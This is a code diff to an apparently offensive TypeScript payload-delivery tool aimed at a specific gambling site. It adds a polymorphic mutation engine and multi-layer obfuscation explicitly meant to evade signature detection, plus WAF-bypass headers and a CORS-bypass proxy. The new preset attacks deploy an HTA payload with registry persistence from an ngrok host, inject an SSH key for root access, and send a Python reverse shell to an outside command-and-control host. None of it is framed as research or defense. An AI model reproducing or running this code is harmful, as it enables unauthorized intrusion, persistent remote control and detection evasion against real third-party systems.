@@ -7,6 +7,7 @@ export interface PayloadResult {
   id: string;
   timestamp: number;
   target: string;
+  hostname: string;
   method: string;
   status: number | string;
   response: string;
@@ -20,6 +21,8 @@ export interface PayloadConfig {
   body?: string;
   concurrency: number;
   delay?: number;
+  obfuscate?: boolean;
+  polymorphic?: boolean;
 }
 
 export function generateWafBypassHeaders(): Record<string, string> {
@@ -51,6 +54,7 @@ export function obfuscateUltimaPayload(payload: string): { obfuscated: string; k
   // 2. Base64
   // 3. Reverse
   // 4. Base64 again
+  // 5. Random padding
   const xor = (str: string, key: string) => {
     return Array.from(str).map((c, i) => 
       String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
@@ -61,8 +65,62 @@ export function obfuscateUltimaPayload(payload: string): { obfuscated: string; k
   const step2 = btoa(step1);
   const step3 = step2.split('').reverse().join('');
   const step4 = btoa(step3);
+  const padding = Math.random().toString(36).substring(2, 10);
+  const step5 = `${padding}.${step4}.${padding.split('').reverse().join('')}`;
 
-  return { obfuscated: step4, key: btoa(key) };
+  return { obfuscated: step5, key: btoa(key) };
+}
+
+/**
+ * Polymorphic Mutation Engine
+ * Randomly alters the payload structure to evade signature-based detection.
+ */
+export function polymorphicMutate(payload: string): string {
+  if (!payload) return payload;
+
+  const mutations = [
+    // 1. Add random junk comments (if it looks like code)
+    (p: string) => {
+      if (p.includes('<?php') || p.includes('python')) {
+        const junk = `/* ${Math.random().toString(36).substring(2, 15)} */`;
+        return p.replace(/(\n|^)/, `$1${junk}\n`);
+      }
+      return p;
+    },
+    // 2. Randomize JSON key order (if it's JSON)
+    (p: string) => {
+      try {
+        const obj = JSON.parse(p);
+        const keys = Object.keys(obj).sort(() => Math.random() - 0.5);
+        const newObj: any = {};
+        keys.forEach(k => newObj[k] = obj[k]);
+        return JSON.stringify(newObj);
+      } catch (e) {
+        return p;
+      }
+    },
+    // 3. Add random whitespace/padding
+    (p: string) => {
+      const spaces = ' '.repeat(Math.floor(Math.random() * 5));
+      return p.split('\n').map(line => spaces + line).join('\n');
+    },
+    // 4. Hex encoding for specific strings
+    (p: string) => {
+      return p.replace(/system|exec|shell_exec|eval/g, (match) => {
+        return match.split('').map(c => `\\x${c.charCodeAt(0).toString(16)}`).join('');
+      });
+    }
+  ];
+
+  // Apply 1-3 random mutations
+  let mutated = payload;
+  const count = Math.floor(Math.random() * 3) + 1;
+  for (let i = 0; i < count; i++) {
+    const mutation = mutations[Math.floor(Math.random() * mutations.length)];
+    mutated = mutation(mutated);
+  }
+
+  return mutated;
 }
 
 export async function executePayload(config: PayloadConfig): Promise<PayloadResult[]> {
@@ -71,7 +129,30 @@ export async function executePayload(config: PayloadConfig): Promise<PayloadResu
 
   const sendRequest = async (): Promise<PayloadResult> => {
     const reqStart = Date.now();
+    let hostname = 'unknown';
     try {
+      const urlObj = new URL(config.url);
+      hostname = urlObj.hostname;
+    } catch (e) {
+      hostname = config.url;
+    }
+
+    try {
+      // Apply polymorphism and obfuscation per request
+      let finalBody = config.body;
+      let finalHeaders = { ...config.headers };
+
+      if (config.polymorphic && finalBody) {
+        finalBody = polymorphicMutate(finalBody);
+      }
+
+      if (config.obfuscate && finalBody) {
+        const { obfuscated, key } = obfuscateUltimaPayload(finalBody);
+        finalBody = obfuscated;
+        finalHeaders['X-Aegis-Key'] = key;
+        finalHeaders['X-Payload-Encoding'] = 'ULTIMA-V2';
+      }
+
       // Route through local proxy to bypass CORS
       const proxyUrl = "/api/proxy";
       const response = await fetch(proxyUrl, {
@@ -79,9 +160,9 @@ export async function executePayload(config: PayloadConfig): Promise<PayloadResu
         headers: {
           'Content-Type': 'application/json',
           'x-target-url': config.url,
-          ...config.headers,
+          ...finalHeaders,
         },
-        body: config.method !== 'GET' ? config.body : undefined,
+        body: config.method !== 'GET' ? finalBody : undefined,
       });
 
       const text = await response.text();
@@ -89,6 +170,7 @@ export async function executePayload(config: PayloadConfig): Promise<PayloadResu
         id: Math.random().toString(36).substr(2, 9),
         timestamp: Date.now(),
         target: config.url,
+        hostname,
         method: config.method,
         status: response.status,
         response: text.substring(0, 200),
@@ -99,6 +181,7 @@ export async function executePayload(config: PayloadConfig): Promise<PayloadResu
         id: Math.random().toString(36).substr(2, 9),
         timestamp: Date.now(),
         target: config.url,
+        hostname,
         method: config.method,
         status: 'ERROR',
         response: error.message,
@@ -127,7 +210,20 @@ export const PRESET_PAYLOADS = [
     url: "https://runehall.com/api/user/profile",
     method: "GET",
     concurrency: 1,
-    description: "Attempting to probe for session leakage in response headers."
+    description: "Attempting to probe for session leakage in response headers and unauthorized cookie access."
+  },
+  {
+    name: "Nightfury's Pegasus: HTA Auto-Injector",
+    url: "https://runehall.com/api/v1/system/update",
+    method: "POST",
+    body: JSON.stringify({
+      action: "deploy_hta",
+      payload_url: "http://ngrok-proxy:8000/payload.hta",
+      persistence: "registry_run"
+    }),
+    headers: generateWafBypassHeaders(),
+    concurrency: 1,
+    description: "Deploying the Pegasus HTA auto-injector via system update endpoint for persistent browser control."
   },
   {
     name: "OSRS Highscores Scraper (Deep)",
@@ -276,5 +372,37 @@ export const PRESET_PAYLOADS = [
     headers: generateWafBypassHeaders(),
     concurrency: 5,
     description: "Generating and delivering weaponized URLs with multi-layer obfuscated payloads for stealthy exploitation."
+  },
+  {
+    name: "Aegis Persistence: SSH Key Injection",
+    url: "https://runehall.com/api/v1/system/auth/keys",
+    method: "POST",
+    body: JSON.stringify({ 
+      key: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... aegis-c2",
+      user: "root",
+      action: "append"
+    }),
+    headers: generateWafBypassHeaders(),
+    concurrency: 1,
+    description: "Attempting to inject a persistent SSH public key for direct root access to the target infrastructure."
+  },
+  {
+    name: "Aegis Persistence: Reverse Shell (Python)",
+    url: "https://runehall.com/api/v1/debug/exec",
+    method: "POST",
+    body: JSON.stringify({
+      cmd: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"aegis-c2.run.app\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
+    }),
+    headers: generateWafBypassHeaders(),
+    concurrency: 1,
+    description: "Deploying a persistent Python-based reverse shell for real-time remote command execution."
+  },
+  {
+    name: "Multi-Target: Endpoint Persistence Probe",
+    url: "https://runehall.com/api/v1/auth/session\nhttps://runehall.com/api/v1/user/settings\nhttps://runehall.com/api/v1/admin/logs",
+    method: "GET",
+    headers: generateWafBypassHeaders(),
+    concurrency: 5,
+    description: "Simultaneous probing of multiple critical endpoints to identify persistence opportunities and session leakage."
   }
 ];
